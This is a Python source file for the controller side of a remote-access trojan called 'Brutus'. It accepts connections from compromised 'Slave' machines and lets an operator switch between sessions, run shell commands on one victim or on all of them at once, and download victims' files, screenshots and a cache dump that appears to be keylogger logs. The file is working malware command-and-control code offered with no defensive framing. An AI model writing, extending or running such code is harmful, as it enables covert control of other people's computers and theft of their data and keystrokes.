#!/usr/bin/env python3
import os
import socket
import json
import threading
from app.variables import CONTROLLER_IP, PORT

class Commander:
    def __init__(self, controller_ip=CONTROLLER_IP, port=PORT):
        self.controller_ip = controller_ip 
        self.port = port
        self.screen_count = 1
        self.log_count = 1
        self.threads_active = True
        self.connections = []
        self.addresses = []
        self.connection = None
        self.ip = None
        self.server()
    
    def help_menu(self):
        pass

    def enum_sessions(self):
        connection_number = 0
        print("Session #\t\t\tAddress")
        for address in self.addresses:
            print(str(connection_number) + "\t\t\t" + str(address))
            connection_number = connection_number + 1

    def select_session(self, session_number):
        session_number = int(session_number)
        print("[+] Switching to " + str(self.addresses[session_number]))
        self.connection = self.connections[session_number]
        self.ip = self.addresses[session_number]

    def accept_connections(self): 
        """
        Accept connections in loop...
        """
        while True:
            if (not self.threads_active):
                break
            self.listener.settimeout(1) # impt: prevent hanging once user exits primary thread 
            try:
                connection, address = self.listener.accept()
                self.connections.append(connection)
                self.addresses.append(address[0])
                print(f"\n[+] Received a new connection from {str(address[0])}.")
            except:
                pass

    def server(self):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # allow reuse to est new connection if dropped
        self.listener.bind((self.controller_ip, self.port))
        self.listener.listen(0)
        self.primary_thread = threading.Thread(target=self.accept_connections)
        self.primary_thread.start()
        print("[+] Waiting for incoming connections...")
        self.command_prompt()
    
    def en_masse_execution(self, command):
        session_num = 0
        connections_len = len(self.connections)
        try:
            while (session_num < connections_len):
                self.connection = self.connections[session_num]
                self.ip = self.addresses[session_num]
                self.serialize(command) 
                res = self.deserialize()
                print(self.ip)
                print(res)
                session_num += 1
        except Exception as stderr:
            print(f"[-] Ubiquitious command execution failed. See {stderr}")

    def command_prompt(self):
        while True:
            command_prompt = "* Brutus#: "  # py3
            command = input(command_prompt) # py3
            command = command.split(" ") # convert to list
            primary_command = command[0]
            if (primary_command == "sessions"):
                self.enum_sessions()
            elif (primary_command == "goto" and len(command) > 1):
                self.select_session(command[1])
                self.shell()
            elif (primary_command == "exit"):
                for connection in self.connections:
                    connection.close()
                self.listener.close()
                self.threads_active = False
                self.primary_thread.join()
                break
            elif (primary_command == "exec_all" and len(command) > 1):
                self.en_masse_execution(command)
            else:
                continue

    def send_file(self, path):
        with open(path, "rb") as file:
            self.connection.send(file.read())

    def recv_file(self, path):
        with open(path, "wb") as file:
            self.connection.settimeout(3)
            buffer = self.connection.recv(1024)
            while buffer:
                file.write(buffer)
                try:
                    buffer = self.connection.recv(1024)
                except socket.timeout:
                    break
            self.connection.settimeout(None)
            file.close()

    def serialize(self, data):
        """
        Stream data on broadcast.
        """
        json_data = json.dumps(data)
        json_data = json_data.encode()
        self.connection.send(json_data)

    def deserialize(self):
        """
        Stream data on reception.
        """
        data = ""
        while True:
            try:
                data += self.connection.recv(1024).decode()
                return json.loads(data)
            # less bytes than specified throughput; add to next iteration
            except ValueError: 
                continue

    def shell(self):
        while True:
            command_prompt = "* Slave#~%s: " % str(self.ip)  # py3
            command = input(command_prompt) # py3
            command = command.split(" ") # convert to list
            primary_command = command[0]
            try:
                self.serialize(command)
                if (primary_command == ""):
                    continue
                elif (primary_command == "help"):
                    self.help_menu()
                    continue
                elif (primary_command == "exit"):
                    break
                elif (primary_command == "kill"):
                    self.connection.close()
                    self.connections.remove(self.connection)
                    self.addresses.remove(self.ip)
                    break
                # elif (primary_command == "upload"): # upload TO host
                #     self.send_file(command[1])
                elif (primary_command == "download"): # download FROM host
                    self.recv_file(command[1])
                elif (primary_command == "screenshot"): # download FROM host
                    self.recv_file("screenshot%d" % (self.screen_count))
                    self.screen_count += 1
                elif (primary_command == "dump_cache"): # download FROM host
                    self.recv_file("logfile%d" % (self.log_count))
                    self.log_count += 1
                else:
                    res = self.deserialize()
                    print(res)
            except KeyboardInterrupt:
                continue
            except Exception as stderr:
                print(f"[-] An error occurred during command execution. {stderr}")
                

command = Commander()